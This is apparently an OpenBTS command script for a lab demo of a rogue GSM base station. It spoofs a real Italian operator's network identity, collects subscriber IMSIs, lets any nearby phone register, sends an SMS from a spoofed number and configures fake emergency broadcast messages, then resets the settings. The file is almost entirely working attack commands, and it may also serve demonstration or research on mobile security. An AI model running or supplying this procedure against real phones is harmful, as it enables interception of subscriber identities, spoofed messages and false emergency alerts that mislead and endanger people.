# Set gain and attentuation.
rxgain 2
power 20

# Optional. Use only if we want to try to send emergency message (SMSCB). Set
# the SMSCB path to an already initialized database. Row insertion can be done
# like this:
# $ sqlite3 /vagrant/db/SMSCB.db
# sqlite3> INSERT INTO SMSCB VALUES (0, 0, 0, 0, 0, "My Emergency Message", 0, 0);
config Control.SMSCB.Table "/vagrant/db/SMSCB.db"
restart # Restart to take SMSCB database into account.

# Spoof an italian operator.
config GSM.Identity.ShortName WIND
config GSM.Identity.MCC 222
config GSM.Identity.MNC 88

# Look at IMSI collected.
tmsis

# Authorize one MS to register by its IMSI. 
config Control.LUR.OpenRegistration 2*************7
# Authorize all MS to register (regexp).
config Control.LUR.OpenRegistration .*

# Send an SMS to an IMSI from a spoofed number
sendsms 2*************7 0610102020 "Hey, you!"

# Reset the configuration for the demo purpose.
rmconfig GSM.Identity.ShortName
rmconfig GSM.Identity.MCC
rmconfig GSM.Identity.MNC
rmconfig Control.LUR.OpenRegistration
rmconfig Control.SMSCB.Table
